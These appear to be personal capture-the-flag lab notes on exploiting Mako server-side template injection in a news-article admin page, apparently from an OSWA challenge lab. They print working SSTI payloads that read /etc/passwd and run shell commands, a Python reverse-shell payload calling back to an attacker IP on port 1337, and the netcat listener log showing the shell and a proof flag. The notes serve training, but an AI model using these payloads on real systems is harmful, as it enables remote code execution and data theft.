
once logged in as `admintest` browsing to `http://glaucidium/private/admin/news` leads us to a news page that allows us to test for `SSTI`

![[Pasted image 20241118164327.png]]
upon hitting `CREATE NEW ARTICLE` we are presented with a page that states `MAKO` template formatting which makes us think about `SSTI`
![[Pasted image 20241118164431.png]]
after googling `mako ssti` we come across this `https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation` which gives us 3 payloads to test

displays `id`
```js
${str().join(chr(i)for(i)in[105,100])}
```
achieves `RCE`
```js
${self.module.cache.util.os.popen(str().join(chr(i)for(i)in[105,100])).read()}
```

```js
<%import os%>${os.popen(str().join(chr(i)for(i)in[105,100])).read()}
```
![[Pasted image 20241118164710.png]]
throwing the first example in looks like this
![[Pasted image 20241118164842.png]]
however viewing it on the page that we inserted it in doesn't show any indicator of `SSTI` working
![[Pasted image 20241118164920.png]]
In order to view if `SSTI` is working we have to view the new page from a average user browsing the site by browsing to `http://glaucidium/public/news`
- this shows us the `id` we are looking for which proves `SSTI`
![[Pasted image 20241118165007.png]]
utilizing `${7*7}` also displays results confirming `SSTI`
![[Pasted image 20241118165221.png]]
found this payload on the `hacktricks` page for mako `SSTI` - works
```python
<% IMPORT OS X=OS.POPEN('ID').READ() %> ${X}
```
![[Pasted image 20241118165728.png]]
`<% IMPORT OS X=OS.POPEN('WHOAMI').READ() %> ${X}`
![[Pasted image 20241118170047.png]]
`<% IMPORT OS X=OS.POPEN('CAT /ETC/PASSWD').READ() %> ${X}`
![[Pasted image 20241118170206.png]]
`<% IMPORT OS X=OS.POPEN('which nc').READ() %> ${X}`
![[Pasted image 20241118170302.png]]
current working directory
![[Pasted image 20241118171352.png]]
curl
![[Pasted image 20241118171711.png]]
showing `$PATH` to make sure we dont need to say full path
![[Pasted image 20241118171827.png]]
making sure `/tmp` is available
![[Pasted image 20241118172159.png]]

full payload that allowed for rce - because `MAKO` is a template that uses `python` 
- got a tip from discord because my curl commands werent working
```python
<% import socket, os; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(("192.168.45.155", 1337)); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); os.system("/bin/sh -i"); %>
```

![[Pasted image 20241118173842.png]]
`nc` reverse shell
```bash
â”Œâ”€â”€(rootðŸ’€gobots)-[18Nov2024 22:34:27]-[/home/â€¦/OSWA/challenge_labs/glaucidium/SSRF2gopher-main]                           
â””â”€# nc -lvnp 1337                                                                                                                                                                                          
listening on [any] 1337 ...                                                                                                
connect to [192.168.45.155] from (UNKNOWN) [192.168.183.121] 39924                                                         
/bin/sh: can't access tty; job control turned off                                                                                                                                                          
/app # ls                                                                                                                  
__pycache__                                                                                                                
admin.py                                                                                                                   
app.py                                                                                                                     
db.py                                                                                                                      
inquiries.py                                                                                                               
private.py                                                                                                                 
proof.txt                                                                                                                  
public.py                                                                                                                  
static                                                                                                                     
templates                                                                                                                  
user.py                                                                                                                    
/app # cat proof.txt                                                                                                       
f695e0aaf23862f5bb9d8c52cef86bad

```
![[Pasted image 20241118173906.png]]
crashed page
